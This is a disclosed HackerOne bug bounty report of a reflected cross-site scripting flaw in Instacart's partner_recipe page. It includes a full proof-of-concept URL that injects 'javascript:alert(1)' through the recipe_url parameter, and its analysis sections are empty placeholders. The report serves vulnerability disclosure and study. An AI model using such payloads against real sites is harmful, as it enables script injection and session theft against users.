---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '196221'
original_report_id: '196221'
title: XSS in instacart.com/store/partner_recipe
weakness: Cross-site Scripting (XSS) - Generic
team_handle: instacart
created_at: '2017-01-06T10:03:27.020Z'
disclosed_at: '2017-05-11T19:10:14.042Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in instacart.com/store/partner_recipe

## Metadata

- HackerOne Report ID: 196221
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: instacart
- Disclosed At: 2017-05-11T19:10:14.042Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Please open the following url
```
https://www.instacart.com/store/partner_recipe?recipe_url=javascript:alert(1)&partner_name=&ingredients%5B%5D=apples&ingredients%5B%5D=butter&ingredients%5B%5D=Splenda+Brown+Sugar+Blend&ingredients%5B%5D=cinnamon&ingredients%5B%5D=nutmeg&title=Barb%27s+Fried+Apples+-Diabetic-Low+Fat&description=&image_url=%2Fassets%2Fimg%2Fno-recipe-image.jpg
```

and click on the "Barb's Fried Apples -Diabetic-Low Fat" image to trigger the payload.

The affected parameter is
recipe_url

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
